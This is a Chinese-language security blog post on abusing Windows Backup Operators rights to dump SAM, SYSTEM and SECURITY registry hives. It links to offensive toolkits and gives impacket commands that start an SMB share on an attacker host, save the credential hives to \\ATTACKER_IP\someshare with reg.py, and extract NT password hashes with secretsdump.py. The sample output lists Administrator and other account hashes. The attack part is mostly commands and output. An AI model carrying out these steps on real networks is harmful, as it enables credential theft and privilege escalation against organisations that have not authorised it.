---
title: SAM转储 & Back Operators权限利用
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# SAM转储 & Back Operators权限利用

## 当前用户属于Backup Operators 并且有shell

> https://github.com/improsec/BackupOperatorToolkit?tab=readme-ov-file
> 

> https://github.com/mpgn/BackupOperatorToDA
> 

> https://blog.csdn.net/shuteer_xu/article/details/140972317
> 

## 当用户在Backup Operators 组下

### 在Linux下的解决方案

> https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets#exfiltration
> 

配置impacket工具包使用

1. 开启`SMB`服务器，方便将文件导出到服务器
    
    ```python
    smbserver.py -smb2support "someshare" "./"
    ```
    
2. 通过`impacket`的`reg.py`来操作
    
    ```python
    # save each hive manually
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'
    
    # backup all SAM, SYSTEM and SECURITY hives at once
    reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
    ```
    
3. 本地导出密码
    
    ```python
    secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL              
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
    [*] Cleaning up...
    ```